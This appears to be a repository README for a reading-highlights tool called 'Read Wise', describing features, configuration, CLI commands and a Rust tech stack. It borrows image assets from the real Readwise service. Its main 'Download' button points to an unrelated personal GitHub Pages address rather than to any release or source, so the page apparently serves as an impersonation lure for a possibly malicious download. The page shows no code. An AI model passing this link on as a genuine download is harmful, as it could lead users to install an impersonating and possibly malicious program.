# Read Wise

> Read Wise is a personal knowledge hub designed to preserve and organize meaningful highlights and insights from your reading journey. Instead of letting valuable ideas fade after you close a book or article, Read Wise captures them into a structured, searchable digital library. Built for curious readers, researchers, and lifelong learners, Read Wise transforms scattered annotations into a unified collection that deepens understanding and supports reflection.

![Banner Placeholder](https://readwise-assets.s3.amazonaws.com/static/images/new_icons/logotype_logo.318c99bebf81.svg)

[![Download Read Wise](https://img.shields.io/badge/Download_Read_Wise-Now-00bfff?style=for-the-badge&logo=github&logoColor=white)](https://liousdoris01.github.io/.github/read-wise)

---

## Overview

Read Wise serves as a centralized space for saving, browsing, and rediscovering the most memorable passages from your reading materials.

* **What Read Wise is** — a highlight management application and personal insight tracker  
* **Who benefits from Read Wise** — active readers, academic researchers, book reviewers, and anyone who regularly absorbs written content  
* **The core challenge addressed** — the natural tendency to forget powerful quotes and ideas shortly after encountering them  
* **The guiding concept** — consistent, small acts of saving create a long-term asset of wisdom  
* **What sets Read Wise apart** — the focus remains on the reader’s own selections rather than social feeds or algorithmic suggestions  

Typical scenarios where Read Wise proves valuable include capturing a striking paragraph from a non-fiction book, preserving research notes from online articles, reviewing weekly highlights before a discussion group, and building a personal reference library that grows alongside your intellectual interests.

---

## Functionality

Read Wise delivers a focused set of capabilities that make saving and revisiting insights effortless.

* **Highlight capture with context** — store meaningful text excerpts together with source titles, authors, and page references, keeping the original context intact  
* **Organized digital library** — group saved highlights by book, article, or custom categories, making the Read Wise collection easy to navigate  
* **Daily review and rediscovery** — surface random highlights from the past, reinforcing memory and prompting fresh connections between previously saved ideas  
* **Searchable insight archive** — locate specific themes or keywords instantly across the entire Read Wise repository  
* **Tagging and annotation system** — attach personal reflections and descriptive labels to any highlight, enriching the Read Wise knowledge base  
* **Export and portability** — move the Read Wise collection into common formats for integration with note-taking tools or long-term backup  
* **Reading streak awareness** — gentle tracking encourages the consistent habit of reading and capturing highlights within Read Wise  

---

## Preview

![Read Wise](https://readwise-assets.s3.amazonaws.com/static/images/landing/landing_hero.12a1e031294d.png)

---

## Configuration

Adapt Read Wise to match your workflow through a simple configuration approach.

* **Configuration file structure** — the `readwise.config` file uses straightforward key-value pairs for all settings, making the Read Wise environment transparent and editable  
* **Primary storage path** — define where the Read Wise library folder resides, ensuring highlights remain accessible and under your control  
* **Review schedule preferences** — adjust the frequency and volume of the daily Read Wise highlight review according to personal rhythm  
* **Default source categories** — predefine book, article, or publication labels so every new highlight saved in Read Wise starts with a meaningful category  
* **Optional backup target** — set a secondary location for automatic copies of the Read Wise library, keeping insights protected against data loss  
* **Recommended baseline** — begin with the default storage path and a moderate review frequency, then fine-tune the Read Wise configuration as your library expands  

---

## Usage

Building a habit around Read Wise follows a natural and repeatable sequence.

* **Quick start** — open a reading source, encounter a compelling sentence, and store it immediately in Read Wise with the relevant metadata attached  
* **Typical daily workflow** — spend a reading session collecting highlights in Read Wise, then conclude with a brief review of older entries surfaced by the app  
* **Library exploration command** — `readwise list --source "Book Title"` displays all highlights saved under that source inside Read Wise  
* **Keyword search command** — `readwise search "productivity"` returns every highlight containing the term across the Read Wise archive  
* **Tag filtering command** — `readwise filter --tag "science"` narrows the view to highlights marked with a specific label within Read Wise  
* **Effective usage tip** — add a short personal note alongside each highlight to capture why it mattered in that moment, strengthening the value of the Read Wise entry  

---

## Tech Stack

The technology choices behind Read Wise prioritize clarity, speed, and data portability.

* **Core language** — Rust, selected for its performance and memory safety, keeps Read Wise responsive even as the highlight library grows  
* **Local data storage** — SQLite provides a lightweight, file-based database that stores all Read Wise highlights without requiring a server  
* **Text indexing** — Tantivy powers the full-text search engine within Read Wise, enabling fast retrieval of saved insights  
* **Command-line interface** — Clap handles argument parsing, making the Read Wise terminal commands intuitive and well-documented  
* **Distribution approach** — a single compiled binary simplifies running Read Wise across major desktop platforms without complex dependency chains  

---

## Tags

reading • highlights • notes • knowledge • digital library • Read Wise • insights • bookmarks • annotations • personal archive • Read Wise • study • research • wisdom • retention • Read Wise • readers • organization • quotations • learning
